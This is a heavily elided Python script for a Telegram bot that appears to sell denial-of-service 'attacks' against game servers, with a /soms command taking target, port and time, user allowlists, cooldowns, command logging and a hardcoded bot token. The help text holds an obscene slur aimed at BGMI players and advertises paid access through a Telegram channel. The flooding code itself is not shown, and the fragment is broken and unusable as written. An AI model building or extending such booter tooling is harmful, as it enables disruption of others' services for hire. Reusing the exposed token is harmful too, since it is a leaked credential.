...
bot = telebot.TeleBot('7802573234:AAFbsfmEm-M3RdQor5LZuUCd7wA-3PiarDE')
...
def start_attack_reply(message, target, port, time):
    ...
    # Dictionary to store the last time each user ran the /soms command
bgmi_cooldown = {}
...
@bot.message_handler(commands=['soms'])
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 300:
                ...
                try:
                    record_command_logs(user_id, '/soms', target, port, time)
            ...
            response = "Usage: /soms <target> <port> <time>"
    else:
...
def show_help(message):
    help_text ='''
💥 /soms : 😫BGMI WALO KI MAA KO CHODO🥵. 
...
Buy From :- @SomsPvtt
Official Channel :- https://t.me/SomsPvtt
'''
...
3. MAKE SURE YOU JOINED https://t.me/SomsPvtt OTHERWISE NOT WORK
